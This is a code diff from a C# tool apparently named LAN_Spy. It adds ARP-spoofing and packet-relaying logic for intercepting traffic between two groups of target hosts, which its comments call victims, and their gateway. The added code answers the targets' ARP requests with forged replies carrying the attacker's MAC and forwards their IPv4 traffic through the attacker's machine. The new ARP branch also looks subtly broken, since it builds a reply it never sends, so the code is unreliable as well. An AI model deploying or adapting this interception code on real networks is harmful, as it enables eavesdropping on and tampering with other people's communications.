@@ -1,7 +1,9 @@
 ﻿using PacketDotNet;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics.Eventing.Reader;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Threading;
 using PacketDotNet.Utils;
 using SharpPcap;
@@ -72,11 +74,12 @@ namespace LAN_Spy {
             if (!(_device = DeviceList[CurDevIndex]).Started) {
                 _device.OnPacketArrival += Device_OnPacketArrival;
                 _device.Open();
+                _device.Filter = "arp or ip";
                 _device.StartCapture();
             }
             
             // 创建包转发线程
-            for (int i = 0; i < 8; i++) {
+            for (int i = 0; i < 32; i++) {
                 Thread retransmissionThread = new Thread(RetransmissionThread);
                 retransmissionThread.Start();
                 _retransmissionThreads.Add(retransmissionThread);
@@ -156,42 +159,73 @@ namespace LAN_Spy {
                     if ((packet = NextRawCapture) != null) {
                         // 分析数据包中的数据
                         EthernetPacket ether = new EthernetPacket(new ByteArraySegment(packet.Data));
-                        if (ether.Type != EthernetPacketType.IpV4) continue;
 
-                        // 解析IPv4包地址
-                        Host host;
-                        IPv4Packet ipv4Packet = (IPv4Packet) ether.PayloadPacket;
-                        if (ether.SourceHwAddress.ToString().Equals(_gateway.PhysicalAddress.ToString())) {
-                            // 网关发给受害者的数据包，重定向目标地址到受害者
-                            host = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
-                                   _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
-                            if (host != null)
-                                ether.DestinationHwAddress = host.PhysicalAddress;
-                        }
-                        else {
-                            host = _target1.Find(item => item.PhysicalAddress.ToString().Equals(ether.SourceHwAddress.ToString())) ??
-                                   _target2.Find(item => item.PhysicalAddress.ToString().Equals(ether.SourceHwAddress.ToString()));
+                        // 由本机发出的数据包，忽略
+                        if (ether.SourceHwAddress.ToString().Equals( _device.MacAddress.ToString())) continue;
 
-                            // 与受害者无关的数据包，跳过
-                            if (host == null) continue;
+                        if (ether.Type == EthernetPacketType.IpV4) {
+                            // 解析IPv4包
+                            IPv4Packet ipv4Packet = (IPv4Packet) ether.PayloadPacket;
 
-                            // 受害者发出的数据包，检查接收者
-                            host = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
-                                   _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
-
-                            if (host == null) {
-                                // 受害者发给非受害者的数据包，重定向目标地址到网关
+                            // 检查数据包源和目的是否在目标列表中
+                            Host src = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())) ??
+                                       _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.SourceAddress.ToString())),
+                                dest = _target1.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString())) ??
+                                       _target2.Find(item => item.IPAddress.ToString().Equals(ipv4Packet.DestinationAddress.ToString()));
+                            
+                            // 两组间发送的数据包
+                            if (_target1.Contains(src) && _target2.Contains(dest) ||
+                                _target2.Contains(src) && _target1.Contains(dest))
+                                ether.DestinationHwAddress = dest.PhysicalAddress;
+                            // 组1或组2发送到外网的数据包
+                            else if ((_target1.Contains(src) || _target2.Contains(src)) && dest == null)
                                 ether.DestinationHwAddress = _gateway.PhysicalAddress;
-                            }
-                            else {
-                                // 受害者发给受害者的数据包，重定向目标地址到受害者，源地址到攻击者
-                                ether.DestinationHwAddress = host.PhysicalAddress;
-                                ether.SourceHwAddress = _device.MacAddress;
-                            }
+                            // 外网发送给组1或组2的数据包
+                            else if ((_target1.Contains(dest) || _target2.Contains(dest)) && src == null)
+                                ether.DestinationHwAddress = dest.PhysicalAddress;
+                            // 不需要转发数据包
+                            else
+                                continue;
+                            
+                            // 转发数据包到指定目标
+                            ether.SourceHwAddress = _device.MacAddress;
+                            _device.SendPacket(ether);
                         }
-                        
-                        // 转发数据包到指定目标
-                        _device.SendPacket(ether);
+                        else if (ether.Type == EthernetPacketType.Arp) {
+                            // 解析ARP包
+                            ARPPacket arp = (ARPPacket) ether.PayloadPacket;
+
+                            // 仅处理ARP请求包
+                            if (arp.Operation != ARPOperation.Request) continue;
+
+                            // 检查数据包源和目的是否在目标列表中
+                            Host src = _target1.Find(item => item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString())) ??
+                                       _target2.Find(item => item.IPAddress.ToString().Equals(arp.SenderProtocolAddress.ToString())),
+                                dest = _target1.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString())) ??
+                                       _target2.Find(item => item.IPAddress.ToString().Equals(arp.TargetProtocolAddress.ToString()));
+                            
+                            // 非两组间发送的数据包，跳过
+                            if ((!_target1.Contains(src) || !_target2.Contains(dest)) &&
+                                (!_target2.Contains(src) || !_target1.Contains(dest))) continue;
+
+                            // 构建包信息
+                            EthernetPacket e = new EthernetPacket(_device.MacAddress,
+                                arp.SenderHardwareAddress,
+                                EthernetPacketType.Arp);
+                            ARPPacket a = new ARPPacket(ARPOperation.Response,
+                                arp.SenderHardwareAddress,
+                                arp.SenderProtocolAddress,
+                                _device.MacAddress,
+                                arp.TargetProtocolAddress) {
+                                HardwareAddressType = LinkLayers.Ethernet,
+                                ProtocolAddressType = EthernetPacketType.IpV4
+                            };
+                            ether.PayloadPacket = arp;
+                            arp.ParentPacket = ether;
+
+                            // 发送响应包到指定目标
+                            _device.SendPacket(e);
+                        }
                     } else {
                         // 队列尚未获得数据，挂起等待
                         Thread.Sleep(100);
